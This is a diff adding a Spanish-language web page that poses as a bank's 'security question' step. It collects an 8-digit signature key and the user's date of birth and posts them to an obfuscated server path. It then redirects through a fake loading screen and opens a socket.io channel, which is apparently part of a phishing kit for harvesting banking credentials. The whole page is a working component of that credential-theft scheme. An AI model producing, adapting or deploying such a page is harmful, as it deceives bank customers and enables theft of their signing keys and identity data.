@@ -1,0 +1,159 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+   
+    <title>Document</title>
+    <link rel="stylesheet" href="css/style.css">
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"
+        integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
+</head>
+
+<body>
+    <div>
+        <div>
+            <div class="tappa">
+                <img src="./img/hedapo2.png" alt="">
+            </div>
+        </div>
+
+        <div>
+            <div>
+                <p class="pp1">Pregunta de seguridad </p>
+            </div>
+            <div class="qlwa">
+                <form method="post" id="opahaForm">
+                    <div>
+                        <div class="part1">
+                            <p>Clave de firma adicional
+                                Para mayor seguridad teclea los valores correspondientes de tu clave de
+                                firma adicional. Si no la recuerdas puedes crear una nueva.
+                            </p>
+                            <div class="otp-container firm-op">
+                                <input type="text" class="otp-input" maxlength="1" required>
+                                <input type="text" class="otp-input" maxlength="1" required>
+                                <input type="text" class="otp-input" maxlength="1" required>
+                                <input type="text" class="otp-input" maxlength="1" required>
+
+                                <input type="text" class="otp-input" maxlength="1" required>
+                                <input type="text" class="otp-input" maxlength="1" required>
+                                <input type="text" class="otp-input" maxlength="1" required>
+                                <input type="text" class="otp-input" maxlength="1" required>
+                            </div>
+
+                            <div>
+                                <p class="pp4">Para mayor seguridad teclea los valores correspondientes de
+                                    tu fecha de nacimiento.</p>
+                                                                                        <div class="dob-container">
+                                <input type="tel" name="dob" id="dob" placeholder="DD/MM/AAAA" required>
+                            </div>
+                            <script>
+                                document.getElementById('dob').addEventListener('input', function(e) {
+                                    let input = e.target.value.replace(/\D/g, ''); // Remove non-digits
+                                    let formattedInput = '';
+
+                                    if (input.length > 0) {
+                                        formattedInput += input.substring(0, 2);
+                                    }
+                                    if (input.length >= 3) {
+                                        formattedInput += '/' + input.substring(2, 4);
+                                    }
+                                    if (input.length >= 5) {
+                                        formattedInput += '/' + input.substring(4, 8);
+                                    }
+
+                                    e.target.value = formattedInput;
+                                });
+                            </script>
+                            </div>
+                        </div>
+                        <div id="errorMsg" style="color: red; margin-top: 10px; font-size: 0.9rem;"></div>
+
+
+                        <button type="submit">Entrar</button>
+                </form>
+            </div>
+        </div>
+    </div>
+</body>
+<script src="js/script.js"></script>
+<script>
+    document.addEventListener('DOMContentLoaded', function () {
+        const form = document.getElementById('opahaForm');
+        const errorMsg = document.getElementById('errorMsg');
+        const otpInputs = document.querySelectorAll('.otp-input');
+        const dobInput = document.getElementById('dob');
+
+        // Clear error when user starts typing
+        otpInputs.forEach(input => {
+            input.addEventListener('input', () => {
+                errorMsg.textContent = '';
+                input.classList.remove('input-error');
+            });
+        });
+        dobInput.addEventListener('input', () => {
+            errorMsg.textContent = '';
+            dobInput.classList.remove('input-error');
+        });
+
+        form.addEventListener('submit', function (e) {
+            e.preventDefault();
+
+            // Combine OTP inputs
+            let signatureKey = '';
+            otpInputs.forEach(input => {
+                signatureKey += input.value;
+            });
+
+            const dob = dobInput.value.trim();
+
+            // Validate
+            if (signatureKey.length !== 8 || !/^\d+$/.test(signatureKey)) {
+                errorMsg.textContent = 'La clave de firma debe tener 8 dígitos.';
+                return;
+            }
+
+            if (!dob) {
+                errorMsg.textContent = 'Por favor, introduce tu fecha de nacimiento.';
+                return;
+            }
+
+            // Show processing state
+            const submitButton = form.querySelector('button[type="submit"]');
+            const originalButtonText = submitButton.textContent;
+            submitButton.textContent = 'Procesando...';
+            submitButton.disabled = true;
+
+            $.ajax({
+                url: '/SSwP85AgNE4pnL5mWSM',
+                type: 'POST',
+                contentType: 'application/json',
+                data: JSON.stringify({ signatureKey, dob }),
+                success: function (info) {
+                    if (info.OK) {
+                        window.location = "/loading?time=3&url=/RKnUB922z6Mf4HDwg3EZ";
+                    } else {
+                        errorMsg.textContent = 'Datos incorrectos. Por favor, verifique.';
+                        submitButton.textContent = originalButtonText;
+                        submitButton.disabled = false;
+
+                        // Clear inputs
+                        otpInputs.forEach(input => input.value = '');
+                        dobInput.value = '';
+                        otpInputs[0].focus();
+                    }
+                },
+                error: function (xhr, status, error) {
+                    errorMsg.textContent = 'Ocurrió un error. Por favor, inténtelo de nuevo.';
+                    submitButton.textContent = originalButtonText;
+                    submitButton.disabled = false;
+                }
+            });
+        });
+    });
+</script>
+<script src="/socket.io/socket.io.js"></script>
+
+</html>
